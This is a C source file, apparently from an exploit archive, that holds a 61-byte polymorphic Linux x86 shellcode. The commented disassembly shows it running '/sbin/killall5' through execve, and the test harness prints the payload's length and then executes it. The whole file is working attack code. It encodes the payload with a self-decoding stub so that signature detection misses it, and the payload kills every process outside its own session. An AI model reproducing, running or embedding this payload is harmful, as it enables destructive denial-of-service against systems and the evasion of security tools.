/*
   Title:	Linux x86 | Polymorphic Shellcode killall5 - 61 bytes
   Author: 	Jonathan Salwan
   Mail:	submit [!] shell-storm.org

	! DataBase of shellcode ==> http://www.shell-storm.org/shellcode/


   killall5 is the SystemV killall command. It sends a signal to all processes
   except the processes in its own session, so it won't kill the shell that is
   running the script it was called from. Its primary (only) use is in the rc
   scripts found in the /etc/init.d directory.


 Original Informations
 =====================

 Disassembly of section .text:

 08048054 <.text>:
 8048054:       31 c0                   xor    %eax,%eax
 8048056:       50                      push   %eax
 8048057:       66 68 6c 35             pushw  $0x356c
 804805b:       68 6c 6c 61 6c          push   $0x6c616c6c
 8048060:       68 6e 2f 6b 69          push   $0x696b2f6e
 8048065:       68 2f 73 62 69          push   $0x6962732f
 804806a:       89 e3                   mov    %esp,%ebx
 804806c:       50                      push   %eax
 804806d:       89 e2                   mov    %esp,%edx
 804806f:       53                      push   %ebx
 8048070:       89 e1                   mov    %esp,%ecx
 8048072:       b0 0b                   mov    $0xb,%al
 8048074:       cd 80                   int    $0x80

*/

#include "stdio.h"

int main(int argc, char *argv[])
{

char shellcode[] =

			"\xeb\x11\x5e\x31\xc9\xb1\x37\x80"
			"\x6c\x0e\xff\x01\x80\xe9\x01\x75"
  			"\xf6\xeb\x05\xe8\xea\xff\xff\xff"
			"\x32\xc1\x51\x67\x69\x6d\x36\x69"
			"\x6d\x6d\x62\x6d\x69\x6f\x30\x6c"
			"\x6a\x69\x30\x74\x63\x6a\x8a\xe4"
			"\x51\x8a\xe3\x54\x8a\xe2\xb1\x0c"
			"\xce\x81\x41\xce\x81";

	printf("Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();

	return 0;
}

// milw0rm.com [2009-08-11]